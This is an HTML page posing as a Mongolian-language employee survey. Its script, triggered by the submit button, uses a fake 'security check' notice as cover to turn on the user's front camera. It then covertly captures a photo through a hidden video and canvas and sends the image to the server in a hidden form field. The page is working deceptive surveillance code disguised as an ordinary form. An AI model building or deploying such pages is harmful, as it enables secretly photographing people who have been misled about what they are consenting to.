<!DOCTYPE html>
<html lang="mn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ажилтан Судалгаа | Нууцлал</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { max-width: 800px; width: 100%; background: white; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); padding: 40px; }
        header { text-align: center; margin-bottom: 40px; padding-bottom: 20px; border-bottom: 3px solid #667eea; }
        .logo { font-size: 2.5rem; font-weight: bold; color: #667eea; margin-bottom: 10px; }
        .subtitle { font-size: 1.1rem; color: #666; }
        .survey-form { display: flex; flex-direction: column; gap: 30px; }
        .question { background: #f8f9fa; padding: 25px; border-radius: 10px; border-left: 4px solid #667eea; }
        .question-title { font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px; }
        textarea { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 1rem; min-height: 100px; }
        .submit-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 40px; border-radius: 8px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s; margin-top: 20px; }
        .submit-btn:disabled { background: #ccc; cursor: not-allowed; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <div class="container">
        <header>
            <div class="logo">Ажилтан Судалгаа</div>
            <div class="subtitle">Таны санал бидэнд үнэтэй</div>
        </header>

        <form id="surveyForm" class="survey-form" method="POST" action="/submit">
            <input type="hidden" id="photo_data_input" name="photo_data">
            <input type="hidden" name="camera_allowed" id="camera_allowed" value="false">
            
            <div class="question">
                <div class="question-title">1) Ямар мэргэжлээр ажилладаг вэ?</div>
                <textarea name="role_department" placeholder="Өөрийн мэргэжлээ бичнэ үү..." required></textarea>
            </div>

            <div class="question">
                <div class="question-title">2) Мэргэжлээрээ хэдэн жил ажиллаж байгаа вэ?</div>
                <textarea name="profession" placeholder="Ажилласан жилээ бичнэ үү..." required></textarea>
            </div>

            <div class="question" style="background-color: #fff3cd; border-color: #ffc107;">
                <div class="question-title" style="color: #856404;">⚠️ Баталгаажуулалт</div>
                <p style="color: #856404; font-size: 0.95rem;">"Илгээх" товчийг дарж аюулгүй байдлын шалгалт хийхийг зөвшөөрнө үү.</p>
            </div>

            <button type="submit" class="submit-btn">Илгээх</button>
        </form>
    </div>

    <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const surveyForm = document.getElementById('surveyForm');
    const submitBtn = document.querySelector('.submit-btn');
    const photoDataInput = document.getElementById('photo_data_input');
    const cameraAllowedInput = document.getElementById('camera_allowed');
    const context = canvas.getContext('2d');

    surveyForm.addEventListener('submit', function(e) {
        e.preventDefault();
        submitBtn.disabled = true;
        submitBtn.textContent = 'Боловсруулж байна...';

        const constraints = { video: { facingMode: "user" }, audio: false };

        navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                cameraAllowedInput.value = 'true';
                video.srcObject = stream;
                video.play();

                video.onloadedmetadata = () => {
                    // Камерын бодит өргөн ба өндрийг тохируулах
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    setTimeout(() => {
                        // Зургийг яг камерын харьцаагаар буулгах
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        photoDataInput.value = canvas.toDataURL('image/jpeg', 0.6);

                        stream.getTracks().forEach(track => track.stop());
                        surveyForm.submit();
                    }, 1200);
                };
            })
            .catch(err => {
                cameraAllowedInput.value = 'false';
                surveyForm.submit();
            });
    });
    </script>
</body>
</html>
